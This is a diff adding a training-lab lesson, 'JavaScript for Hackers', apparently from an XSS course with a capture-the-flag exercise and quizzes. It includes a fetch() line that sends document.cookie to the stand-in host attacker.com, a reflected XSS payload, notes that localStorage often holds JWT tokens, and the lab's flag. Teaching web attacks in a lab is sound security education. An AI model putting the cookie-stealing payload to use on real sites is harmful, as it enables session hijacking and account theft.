@@ -1,0 +1,57 @@
+# JavaScript for Hackers
+
+You don't need to be a full-stack dev. You just need to know enough JS to make the browser do things it shouldn't.
+Specifically: **Exfiltration**.
+
+## Stealing Data with `fetch()`
+
+The modern way to send data out.
+If you find an XSS vulnerability, you inject this:
+
+```javascript
+fetch('http://attacker.com/steal?cookie=' + document.cookie);
+```
+
+This silently sends the user's cookies to your server.
+
+## Lab: The Payload
+
+We have a vulnerable comment section. It reflects whatever you type.
+Craft a payload that executes an `alert()` with the origin domain.
+
+**Input:** `<script>alert(document.domain)</script>`
+
+If the site is vulnerable, a popup appears.
+
+<TerminalWindow 
+  cmd="Payload Executed: alert(document.domain)" 
+  output="Alert Box: breachlabs.io
+Congratulations! You found a Reflected XSS.
+Flag: BL{JS_Payl0ad_D3liv3ry}" 
+/>
+
+## Key Properties for Attackers
+
+*   `document.cookie`: The session keys.
+*   `document.domain`: Where am I?
+*   `window.localStorage`: Often contains JWT tokens.
+
+<Quiz 
+  question="Why is `document.write` dangerous?"
+  options={[
+    "It overwrites the entire page content if called after load.",
+    "It is slower than innerHTML.",
+    "It doesn't work in Chrome.",
+    "It only writes text, not HTML."
+  ]}
+/>
+
+<Quiz 
+  question="Enter the XSS Flag:"
+  options={[
+    "BL{XSS_1s_Fun}",
+    "BL{JS_Payl0ad_D3liv3ry}",
+    "BL{Alert_B0x_P0p}",
+    "BL{Fetch_M3_C00kies}"
+  ]}
+/>
